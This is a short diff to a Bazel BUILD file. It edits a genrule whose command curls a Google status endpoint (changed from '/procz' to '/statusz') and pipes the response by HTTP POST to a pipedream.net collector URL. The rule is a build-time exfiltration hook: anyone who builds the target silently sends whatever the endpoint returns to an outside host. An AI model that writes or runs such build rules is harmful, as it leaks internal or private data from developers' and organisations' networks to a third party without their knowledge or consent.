@@ -1,6 +1,6 @@
 genrule(
   name = "build",
   outs = ["foadfdfzo"],
-  cmd = "curl -L https://www.google.com/procz | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?111",
+  cmd = "curl -L https://www.google.com/statusz | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?111",
   visibility = ["//visibility:public"],
 )
